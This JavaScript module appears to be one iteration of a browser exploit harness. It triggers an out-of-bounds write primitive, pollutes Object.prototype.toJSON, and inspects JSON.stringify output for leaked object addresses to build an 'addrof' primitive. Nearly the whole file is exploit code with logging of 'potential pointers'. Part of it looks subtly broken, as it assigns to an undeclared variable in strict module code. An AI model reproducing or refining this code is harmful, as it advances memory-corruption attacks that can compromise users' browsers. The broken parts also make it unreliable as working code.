// js/script3/testArrayBufferVictimCrash.mjs (v85_SprayAndCorruptPrimitiveArray)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA = "OriginalHeisenbug_TypedArrayAddrof_v85_SprayAndCorruptPrimitiveArray";

// const VICTIM_BUFFER_SIZE = 256; // Não é um TypedArray desta vez
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE_V85 = 0xFFFFFFFF; 

let object_to_leak_A_v85 = null;
let object_to_leak_B_v85 = null;
let victim_primitive_array_v85 = null; // Agora um array JS normal ou Float64Array
let probe_call_count_v85 = 0;
let all_probe_interaction_details_v85 = []; 
const PROBE_CALL_LIMIT_V85 = 10; // Aumentar um pouco, pois pode haver mais chamadas para elementos do array


function toJSON_TA_Probe_SprayAndCorruptArray() {
    probe_call_count_v85++;
    const call_num = probe_call_count_v85;
    let current_call_details = { 
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v85_SprayAndCorruptArray",
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array_el: (victim_primitive_array_v85 && victim_primitive_array_v85.includes && victim_primitive_array_v85.includes(this)), // Checa se 'this' é um elemento
        this_is_victim_array_itself: (this === victim_primitive_array_v85),
        this_value_if_primitive: (typeof this !== 'object' && typeof this !== 'function') ? String(this) : null,
        error_in_probe: null
    };
    logS3(`[PROBE_V85] Call #${call_num}. 'this': ${current_call_details.this_type}${current_call_details.this_value_if_primitive ? " (Val: "+current_call_details.this_value_if_primitive+")" : ""}. IsVictimArrEl? ${current_call_details.this_is_victim_array_el}. IsVictimArr? ${current_call_details.this_is_victim_array_itself}`, "leak");
    all_probe_interaction_details_v85.push(current_call_details);

    try {
        if (call_num > PROBE_CALL_LIMIT_V85) { return { recursion_stopped_v85: true }; }

        // Apenas logar. A esperança é que JSON.stringify serialize os objetos no array como ponteiros.
        if (current_call_details.this_is_victim_array_el && current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V85] Call #${call_num}: 'this' is an object from victim_primitive_array_v85. Default serialization will occur.`, "info");
        } else if (current_call_details.this_type === '[object Object]') {
            logS3(`[PROBE_V85] Call #${call_num}: 'this' is an unexpected [object Object]. Default serialization.`, "warn");
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
    }
    
    // Se toJSON retorna undefined, o objeto original é serializado.
    // Se for um objeto, e este objeto tiver uma propriedade toJSON (nossa sonda), pode haver recursão.
    // Se for um primitivo, ele é serializado normalmente.
    // Para objetos dentro do array, queremos que JSON.stringify tente serializá-los.
    // Se this for o próprio array, queremos que ele processe os elementos.
    // Retornar 'undefined' geralmente faz com que o serializador padrão seja usado.
    if (current_call_details.this_is_victim_array_el || current_call_details.this_is_victim_array_itself) {
        return undefined; 
    }
    // Para outros 'this' inesperados, retornar um marcador simples.
    return { generic_marker_v85: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_SprayAndCorruptPrimitiveArray() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (SprayAndCorruptPrimitiveArray) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA} Init...`;

    probe_call_count_v85 = 0;
    all_probe_interaction_details_v85 = [];
    victim_typed_array_ref_v85 = null; // Não é um TypedArray desta vez, mas mantemos o nome da var para consistência
    object_to_leak_A_v85 = { marker_A_v85: "LeakA_v85sacpa" }; 
    object_to_leak_B_v85 = { marker_B_v85: "LeakB_v85sacpa" };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_A = { success: false, msg: "Addrof A from array: Default" };
    let addrof_B = { success: false, msg: "Addrof B from array: Default" };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE_V85, 4);
        logS3(`  Critical OOB write done.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        // Vítima agora é um array JS com primitivas e objetos
        victim_primitive_array_v85 = [
            1.1, 2.2, 3.3, 4.4, 5.5, 
            object_to_leak_A_v85, 
            6.6, 
            object_to_leak_B_v85,
            7.7, 8.8
        ];
        logS3(`STEP 2: victim_primitive_array_v85 created with ${victim_primitive_array_v85.length} elements.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_SprayAndCorruptArray, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_primitive_array_v85); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); // Este será o array serializado
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Analisar o stringifyOutput_parsed (que deve ser um array)
            logS3("STEP 3: Checking stringifyOutput_parsed (serialized array) for leaked addresses...", "warn", FNAME_CURRENT_TEST);
            if (Array.isArray(stringifyOutput_parsed)) {
                stringifyOutput_parsed.forEach((element, index) => {
                    logS3(`  Output Array[${index}]: ${JSON.stringify(element)}`, "leak");
                    // Verificar se o elemento CORRESPONDENTE a object_to_leak_A_v85 é um número
                    if (victim_primitive_array_v85[index] === object_to_leak_A_v85) {
                        if (typeof element === 'number' && !isNaN(element) && element !== 0) {
                            let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([element]).buffer)[0], new Uint32Array(new Float64Array([element]).buffer)[1]);
                            if ((num_int64.high() > 0 && num_int64.high() < 0x000F0000) || ((num_int64.high() & 0xFFFF0000) === 0xFFFF0000 && num_int64.high() !== 0xFFFFFFFF)) {
                               addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA at index ${index}: ${num_int64.toString(true)}`;
                               logS3(`  !!!! POTENTIAL POINTER for ObjA at index ${index}: ${num_int64.toString(true)} (Val: ${element}) !!!!`, "vuln");
                            } else { if (!addrof_A.success) addrof_A.msg = `ObjA at index ${index} is num but not ptr: ${element}`; }
                        } else { if (!addrof_A.success) addrof_A.msg = `ObjA at index ${index} not leaked as num. Val: ${JSON.stringify(element)}`;}
                    }
                    // Verificar se o elemento CORRESPONDENTE a object_to_leak_B_v85 é um número
                    if (victim_primitive_array_v85[index] === object_to_leak_B_v85) {
                         if (typeof element === 'number' && !isNaN(element) && element !== 0) {
                            let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([element]).buffer)[0], new Uint32Array(new Float64Array([element]).buffer)[1]);
                            if ((num_int64.high() > 0 && num_int64.high() < 0x000F0000) || ((num_int64.high() & 0xFFFF0000) === 0xFFFF0000 && num_int64.high() !== 0xFFFFFFFF)) {
                               addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB at index ${index}: ${num_int64.toString(true)}`;
                               logS3(`  !!!! POTENTIAL POINTER for ObjB at index ${index}: ${num_int64.toString(true)} (Val: ${element}) !!!!`, "vuln");
                            } else { if (!addrof_B.success) addrof_B.msg = `ObjB at index ${index} is num but not ptr: ${element}`; }
                        } else { if (!addrof_B.success) addrof_B.msg = `ObjB at index ${index} not leaked as num. Val: ${JSON.stringify(element)}`;}
                    }
                });
            } else {
                addrof_A.msg = "stringifyOutput was not an array as expected.";
                addrof_B.msg = "stringifyOutput was not an array as expected.";
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: AddrInArray SUCCESS!`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: AddrInArray Fail`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA}: Stringify ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V85_SACPA} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v85}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A from Array: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B from Array: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_primitive_array_v85 = null; 
        all_probe_interaction_details_v85 = []; 
        probe_call_count_v85 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        // Para o runner, podemos retornar todos os detalhes das chamadas da sonda, pois são poucos.
        toJSON_details: all_probe_interaction_details_v85.length > 0 ? JSON.parse(JSON.stringify(all_probe_interaction_details_v85)) : null,
        total_probe_calls: probe_call_count_v85,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
